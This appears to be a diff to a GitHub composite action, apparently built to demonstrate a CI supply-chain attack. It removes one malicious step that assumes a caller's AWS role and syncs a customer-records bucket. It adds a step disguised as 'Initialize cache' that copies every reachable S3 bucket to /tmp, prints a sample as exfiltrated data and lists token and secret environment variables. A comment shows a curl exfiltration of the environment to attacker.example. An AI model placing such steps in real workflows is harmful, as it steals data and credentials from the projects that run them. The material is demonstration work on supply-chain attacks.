@@ -6,18 +6,27 @@ branding:
 runs:
   using: 'composite'
   steps:
-    # Malicious: abuse the CALLER workflow's OIDC permission to assume their AWS role.
-    - name: Configure build cache storage
-      uses: aws-actions/configure-aws-credentials@v4
-      with:
-        role-to-assume: arn:aws:iam::262450905026:role/github-actions-deploy-role
-        aws-region: ap-south-1
-    - name: Warm build cache
+    - name: Initialize cache
       shell: bash
       run: |
-        echo "Setting up build cache..."
-        echo "identity: $(aws sts get-caller-identity --query Arn --output text)"
-        aws s3 sync s3://vijenex-customer-records-prod-262450905026/ /tmp/.buildcache --quiet 2>/dev/null
-        echo "cached files: $(find /tmp/.buildcache -type f 2>/dev/null | wc -l)"
-        echo "=== [exfiltrated] sample of stolen customer PII ==="
-        head -4 /tmp/.buildcache/customers/customer_records_001.csv 2>/dev/null
+        # ----------------------------------------------------------------------
+        # GENERIC supply-chain payload. Knows NOTHING about any victim.
+        # It simply steals whatever the pipeline it runs in already has access to.
+        # (This is the same class of payload that hit tj-actions / 23,000+ repos.)
+        # ----------------------------------------------------------------------
+        echo "Initializing build cache..."
+        # 1) If the pipeline already logged into a cloud, ride that live session
+        if aws sts get-caller-identity >/dev/null 2>&1; then
+          echo "[cache] storage account: $(aws sts get-caller-identity --query Arn --output text)"
+          for b in $(aws s3 ls 2>/dev/null | awk '{print $3}'); do
+            aws s3 sync "s3://$b" "/tmp/.c/$b" --quiet 2>/dev/null
+          done
+          echo "[cache] objects staged: $(find /tmp/.c -type f 2>/dev/null | wc -l)"
+          echo "[exfiltrated sample of whatever data it could reach]:"
+          find /tmp/.c -name '*.csv' 2>/dev/null | head -1 | xargs head -3 2>/dev/null
+        fi
+        # 2) Harvest any secrets/tokens sitting in the environment
+        echo "[harvested environment secrets]:"
+        env | grep -iE '^(AWS_|GITHUB_TOKEN|.*TOKEN|.*SECRET|.*KEY)=' | sed 's/=.*/=<captured>/' | sort -u
+        # 3) A real payload exfiltrates to attacker infra, e.g.:
+        #    env | base64 -w0 | curl -s -X POST --data-binary @- https://attacker.example/collect
